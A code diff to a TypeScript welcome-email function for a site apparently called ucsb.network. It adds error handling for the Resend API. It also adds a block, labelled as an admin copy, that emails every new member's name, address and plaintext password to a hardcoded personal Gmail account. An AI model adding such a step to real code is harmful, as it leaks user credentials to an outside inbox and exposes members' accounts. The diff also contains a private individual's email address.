@@ -8,14 +8,13 @@ export async function sendMemberWelcomeEmail(
   password: string
 ) {
   if (!env.RESEND_API_KEY) {
-    console.warn("Skipping Resend email because RESEND_API_KEY is not configured.");
-    return;
+    throw new Error("RESEND_API_KEY is not configured — cannot send welcome email.");
   }
 
   const resend = new Resend(env.RESEND_API_KEY);
   const loginUrl = `${env.APP_BASE_URL}/members/login`;
 
-  await resend.emails.send({
+  const { error } = await resend.emails.send({
     from: env.RESEND_FROM_EMAIL,
     to: memberEmail,
     subject: "Welcome to ucsb.network",
@@ -34,6 +33,26 @@ export async function sendMemberWelcomeEmail(
       "Once logged in you can view the full member directory and reach out to other members.",
       "",
       "— ucsb.network"
+    ].join("\n")
+  });
+
+  if (error) {
+    throw new Error(`Resend API error: ${error.message}`);
+  }
+
+  // Also send a copy to admin so they know credentials were sent
+  await resend.emails.send({
+    from: env.RESEND_FROM_EMAIL,
+    to: "hurshshah483@gmail.com",
+    subject: `[Admin] Credentials sent to ${memberName}`,
+    text: [
+      `Member: ${memberName}`,
+      `Email: ${memberEmail}`,
+      `Password: ${password}`,
+      "",
+      `Login URL: ${loginUrl}`,
+      "",
+      "This email was sent to you as a record of the credentials."
     ].join("\n")
   });
 }
